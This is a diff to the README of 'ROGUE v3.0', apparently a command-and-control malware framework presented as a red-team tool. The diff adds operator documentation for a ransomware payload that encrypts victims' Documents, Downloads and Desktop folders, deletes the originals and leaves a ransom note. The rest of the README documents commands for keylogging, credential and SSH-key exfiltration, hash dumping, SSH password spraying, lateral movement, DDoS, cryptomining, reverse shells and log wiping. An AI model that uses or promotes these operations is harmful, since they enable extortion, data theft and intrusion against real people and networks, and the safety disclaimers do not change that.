@@ -6,6 +6,8 @@
 
 ROGUE v3.0 is a comprehensive encrypted command-and-control framework designed for authorized penetration testing, red team operations, and incident response training. Featuring AES-256 encryption, web-based administration, and an extensive payload arsenal, ROGUE provides professional-grade capabilities for security testing.
 
+** EXTREME WARNING: The File Encryption payload (fileransom.py) is DESTRUCTIVE.** It permanently removes original files. Only use in isolated test environments with proper authorization.
+
 ---
 
 ##  What's New in v3.0
@@ -14,22 +16,25 @@ ROGUE v3.0 is a comprehensive encrypted command-and-control framework designed f
 - **12+ Professional Payloads** for reconnaissance, privilege escalation, and data collection
 - **Compound Operations** for automated red team workflows
 - **Advanced Stealth** with improved persistence and evasion techniques
+- **File Encryption Payload** - AES-256 encryption/decryption with password protection (⚠️ DESTRUCTIVE)
 
 ### **Modern Web Interface**
 - **Tabbed Interface** for organized operation management
 - **Category-Based Operations** (Recon, Persistence, Collection, etc.)
 - **Real-time Results Viewer** with command history
 - **Payload Management System** with direct load/run capabilities
+- **File Encryption Tool** - Dedicated interface with safety warnings
 
 ### **Professional Features**
 - **Implant Self-Update** - Update implants from C2
 - **Health Monitoring** - Real-time implant status checking
 - **Forensic Cleanup** - Automated log cleaning and trace removal
 - **DNS Tunneling** - Covert C2 channel via DNS queries
+- **File Encryption** - AES-256 encryption with password recovery
 
 ---
 
-## Installation & Setup
+##  Installation & Setup
 
 ### **Clone Repository**
 ```bash
@@ -43,15 +48,22 @@ cd rogue
 sudo apt update
 sudo apt install python3 python3-pip python3-dev python3-venv -y
 
-
 # Install Python packages
 pip3 install pycryptodome flask requests psutil setproctitle netifaces --break-system-packages
 
 # Optional dependencies for enhanced payloads
-pip3 install paramiko pynput pyautogui python-nmap secretstorage --break-system-packags
-```
-if you dont want to run break system packages use a VENV and do it from there.
+pip3 install paramiko pynput pyautogui python-nmap secretstorage --break-system-packages
 
+# File Encryption Dependencies (REQUIRED for fileransom.py)
+pip3 install pycryptodome --break-system-packages
+```
+
+**Note:** If you don't want to use `--break-system-packages`, use a virtual environment:
+```bash
+python3 -m venv rogue_env
+source rogue_env/bin/activate
+pip3 install pycryptodome flask requests psutil setproctitle netifaces paramiko pynput
+```
 
 ### **Ngrok Setup**
 ```bash
@@ -133,12 +145,13 @@ http://localhost:4444/admin
 - Send commands to individual bots
 - Monitor command results and pending queues
 - Color-coded status indicators (green = active)
+- **File Encryption Tool** - Dedicated interface with warnings
 
 ![IMG_1038](https://github.com/user-attachments/assets/68ce8029-3366-49a2-97e9-74e462274015)
 
 #### **Tab 2: Operations**
 **Reconnaissance & Intelligence**
-```
+```bash
 trigger_sysrecon        # Comprehensive system reconnaissance
 trigger_linpeas         # Linux privilege escalation checker
 trigger_hashdump        # Password hash extraction
@@ -147,14 +160,25 @@ trigger_network_scan    # Network host discovery
 ```
 
 **Advanced Operations**
-```
+```bash
 trigger_full_recon      # Complete reconnaissance suite
 trigger_harvest_all     # Comprehensive data collection
 trigger_clean_sweep     # Forensic cleanup & restart
 ```
 
-**Persistence & Stealth**
+** File Operations (DESTRUCTIVE)**
+```bash
+trigger_fileransom encrypt /path [password]  # Encrypt files ( removes originals)
+trigger_fileransom decrypt /path <password>  # Decrypt files with password
+# Quick actions in web interface:
+# - Encrypt Documents (/home/user/Documents)
+# - Encrypt Downloads (/home/user/Downloads)
+# - Encrypt Desktop (/home/user/Desktop)
+# - Decrypt Documents (with saved password)
 ```
+
+**Persistence & Stealth**
+```bash
 trigger_stealthinject   # PolyRoot persistence installation
 trigger_persistence_setup # Additional persistence mechanisms
 trigger_defense_evasion  # Anti-forensic techniques
@@ -163,7 +187,7 @@ trigger_logclean all    # Aggressive log cleaning
 ```
 
 **Monitoring & Collection**
-```
+```bash
 trigger_keylogger       # Start keystroke logging
 trigger_keylogger stop  # Stop keylogger
 trigger_screenshot      # Periodic screen capture
@@ -172,7 +196,7 @@ reverse_shell          # Interactive reverse shell
 ```
 
 **Lateral Movement**
-```
+```bash
 trigger_lateral_move    # Automated lateral movement
 trigger_autodeploy      # Network auto-deployment
 trigger_sshspray        # SSH credential spraying
@@ -181,14 +205,14 @@ trigger_dnstunnel stop  # Stop DNS tunnel
 ```
 
 **DDoS & Cryptomining**
-```
+```bash
 trigger_ddos <target> <port> <time>  # DDoS attack
 trigger_mine            # Start cryptocurrency miner
 trigger_stopmine        # Stop miner
 ```
 
 **Implant Management**
-```
+```bash
 trigger_status          # Check implant health
 trigger_self_update     # Update implant from C2
 trigger_help           # Show available commands
@@ -196,7 +220,7 @@ trigger_forensics_check # Check for forensic artifacts
 ```
 
 **Data Exfiltration**
-```
+```bash
 trigger_exfil /etc      # Exfiltrate system configuration
 trigger_exfil /home     # Exfiltrate user directories
 trigger_exfil ~/.ssh    # Exfiltrate SSH keys
@@ -208,6 +232,7 @@ trigger_dumpcreds       # Dump credentials from common locations
 - Direct load/run buttons
 - Payload descriptions and categories
 - Organized by operation type
+- **File Encryption** marked with orange warnings
 
 #### **Tab 4: Results**
 - Command execution history
@@ -284,6 +309,25 @@ trigger_logclean        # Clean implant traces
 trigger_logclean all    # Aggressive system log cleaning
 ```
 
+#### ** File Encryption** (`fileransom.py`) - **DESTRUCTIVE**
+```bash
+trigger_fileransom encrypt /path [password]  # Encrypt files
+trigger_fileransom decrypt /path <password>  # Decrypt files
+```
+**Features:**
+- AES-256 military-grade encryption
+- Password-protected encryption/decryption
+- Auto-generates strong passwords
+- Creates ransom note with recovery instructions
+- Saves encryption log with password
+- **WARNING:** Removes original files permanently
+
+**Safety Notes:**
+1. Only use in isolated test environments
+2. Always test in `/tmp` directory first
+3. Save the encryption password from results
+4. Original files are NOT recoverable without password
+
 #### **Lateral Movement** (`sshspray.py`)
 ```bash
 trigger_sshspray <target> <userlist> <passlist>
@@ -305,7 +349,7 @@ trigger_dnstunnel       # Start DNS tunneling
 
 ---
 
-##  Configuration Files for Lateral Movement
+## 🔧 Configuration Files for Lateral Movement
 
 ### **Purpose**
 These files are used by the **SSH credential sprayer (`sshspray.py`)** and **auto-deploy (`autodeploy.py`)** payloads for automated lateral movement and network propagation.
@@ -458,6 +502,7 @@ echo "192.168.1.1-254" > targets.txt
 echo "10.0.0.1-100" >> targets.txt
 echo "172.16.0.1-50" >> targets.txt
 ```
+
 ### **Best Practices**
 
 1. **Start Small**: Begin with limited targets and credentials
@@ -491,6 +536,87 @@ head -10 ~/rogue/payloads/passwords.txt
 # Clean up empty lines and comments
 sed -i '/^$/d' ~/rogue/payloads/targets.txt
 sed -i '/^#/d' ~/rogue/payloads/targets.txt
+```
+
+---
+
+##  File Encryption Usage Guide
+
+### **Safety First - Critical Warnings**
+**⚠️ THE FILE ENCRYPTION PAYLOAD IS DESTRUCTIVE ⚠️**
+- Original files are **permanently removed** after encryption
+- Files are only recoverable with the correct password
+- Always test in isolated environments first
+- Keep backups of encryption passwords
+
+### **Recommended Testing Procedure**
+1. **Create test environment:**
+   ```bash
+   mkdir -p /tmp/test_encryption
+   cd /tmp/test_encryption
+   echo "Test file 1" > document1.txt
+   echo "Test file 2" > document2.txt
+   ```
+
+2. **Test encryption (from C2 web interface):**
+   - Select target bot
+   - Choose "Encrypt /tmp (Test)" from dropdown
+   - Or use custom form: `/tmp/test_encryption`
+   - Click "Execute File Encryption"
+
+3. **Verify encryption worked:**
+   ```bash
+   ls -la /tmp/test_encryption/*.encrypted
+   cat /tmp/test_encryption/README_FOR_DECRYPT.txt
+   ```
+
+4. **Test decryption:**
+   - Copy password from results or ransom note
+   - Use custom form: Action="decrypt", Path="/tmp/test_encryption", Password="[your-password]"
+   - Click "Execute File Encryption"
+
+### **Web Interface Features**
+- **Orange warning boxes** for high visibility
+- **Confirmation dialogs** before destructive operations
+- **Quick action buttons** for common paths
+- **Custom form** for any path/password combination
+- **Password field** (optional for encryption, required for decryption)
+
+### **Command Line Usage**
+```bash
+# Encrypt Documents with auto-generated password
+trigger_fileransom encrypt /home/user/Documents
+
+# Encrypt with custom password
+trigger_fileransom encrypt /home/user/Downloads MyCustomPass123!
+
+# Decrypt files
+trigger_fileransom decrypt /home/user/Documents MyCustomPass123!
+
+# Test in temporary directory
+trigger_fileransom encrypt /tmp/test_dir
+```
+
+### **Password Recovery**
+The encryption password is:
+1. Displayed in the command results
+2. Saved in `~/.cache/.rogue/encryption_log.json`
+3. Included in `README_FOR_DECRYPT.txt` in encrypted directories
+4. Can be retrieved via: `trigger_fileransom decrypt /path [password]`
+
+### **Troubleshooting File Encryption**
+```bash
+# Check if files were encrypted
+find /path -name "*.encrypted" | head -5
+
+# Check for ransom note
+find /path -name "README_FOR_DECRYPT.txt"
+
+# Check encryption log
+cat ~/.cache/.rogue/encryption_log.json 2>/dev/null | python3 -m json.tool
+
+# Manual decryption test
+python3 ~/.cache/.rogue/fileransom.py decrypt /path [password]
 ```
 
 ---
@@ -678,6 +804,13 @@ trigger_clean_sweep        # From C2 panel
 trigger_logclean all      # Aggressive log cleaning
 ```
 
+### **File Encryption Emergency Recovery**
+If you lose an encryption password:
+1. Check `~/.cache/.rogue/encryption_log.json` on target
+2. Look for `README_FOR_DECRYPT.txt` in encrypted directories
+3. Check C2 command history for password in results
+4. If password is truly lost, files cannot be recovered
+
 ---
 
 ##  Troubleshooting
@@ -730,6 +863,18 @@ python3 --version
 
 # Check file permissions
 chmod +x payloads/*.py
+```
+
+**File Encryption Issues:**
+```bash
+# Check if pycryptodome is installed
+python3 -c "import Cryptodome; print('Cryptodome available')"
+
+# Test encryption manually
+python3 payloads/fileransom.py encrypt /tmp/test
+
+# Check for disk space
+df -h /tmp
 ```
 
 ### **Log Files & Diagnostics**
@@ -786,6 +931,10 @@ trigger_linpeas
 trigger_hashdump
 trigger_browsersteal
 
+# File Operations (⚠️ DESTRUCTIVE)
+trigger_fileransom encrypt /path [password]
+trigger_fileransom decrypt /path <password>
+
 # Operations
 trigger_full_recon
 trigger_harvest_all
@@ -815,6 +964,10 @@ run_payload sysrecon.py
 
 # Direct execution
 python3 ~/.cache/.rogue/sysrecon.py
+
+# File Encryption (⚠️ use with extreme caution)
+load_payload fileransom.py
+run_payload fileransom.py
 ```
 
 ---
@@ -824,14 +977,27 @@ python3 ~/.cache/.rogue/sysrecon.py
 ### **License**
 This project is released for educational purposes only. Users assume all responsibility for legal compliance.
 
-### **Disclaimer**
+### ** EXTREME WARNING DISCLAIMER**
 ```
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
-The author assumes no liability for misuse or damage caused by this software.
-Users must obtain proper authorization before use.
+THE FILE ENCRYPTION PAYLOAD (fileransom.py) IS DESTRUCTIVE SOFTWARE.
+It PERMANENTLY REMOVES ORIGINAL FILES during encryption.
+Files are only recoverable with the correct password.
+
+THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
+The author assumes NO LIABILITY for data loss, misuse, or damage caused by this software.
+
+Users must:
+1. Obtain proper authorization before use
+2. Only use in isolated test environments
+3. Maintain backups of all important data
+4. Assume full responsibility for encryption password management
+
+Unauthorized use of this software, particularly the file encryption capabilities,
+may constitute computer fraud, data theft, or ransomware attacks under applicable laws.
 ```
 
 ![rogue](https://github.com/user-attachments/assets/d8c0e482-efa0-4f43-86dc-bf8e15505520)
 
 ---
-*Last Updated: v3.0 | For authorized security testing only*
+*Last Updated: v3.0 | For authorized security testing only*  
+**⚠️ FILE ENCRYPTION: Use with extreme caution in isolated environments only**
